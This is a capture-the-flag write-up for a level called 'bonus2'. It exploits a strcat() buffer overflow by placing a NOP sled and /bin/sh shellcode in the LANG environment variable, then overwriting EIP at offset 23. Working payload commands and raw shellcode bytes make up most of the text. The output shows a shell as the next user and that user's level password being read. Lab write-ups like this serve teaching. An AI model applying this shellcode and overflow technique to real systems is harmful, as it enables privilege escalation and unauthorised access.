# bonus2

`strcat()` is vulnerable to buffer overflow: we're gonna use this.  

We just have to write the shellcode in the buffer and overflow the pointer with the shellcode's address, which is by now pretty usual.  
But due to a pointer that kept changing address (even though ...), I wasn't able to use my first, 'usual' solution.  

I tried the same idea but with another method, which is to inject the shellcode directly in an environment variable, `LANG` in this case.  
We just have to retrieve its address :

```sh
$> gdb -q bonus2
(gdb) b main
Breakpoint 1 at 0x804852f
(gdb) r
Starting program: /home/user/bonus2/bonus2 

Breakpoint 1, 0x0804852f in main ()
(gdb) x/32s *((char **)environ)
[...]
0xbffffe4f:	 "LANG=en"
[,,,]
```

We can set our environment variable which consists of the value `nl`, no-ops and the shellcode.

```sh
$> export LANG="nl"$(python -c 'print("\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*100)')
```

As we can see on the code, we have a 72 bytes buffer, 40 are copied from `argv[1]` and 32 from `argv[2]`.  
With a [pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), we can overflow the buffer to find `eip` offset.  
We find `23` with current configuration.  

We can finally create our payload :

```sh
$> ./bonus2 $(python -c 'print("\x90"*40)') $(python -c 'print("\x90"*23 + "\x4f\xfe\xff\xbf")')
Goedemiddag! ??????????????????????????????????????????
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
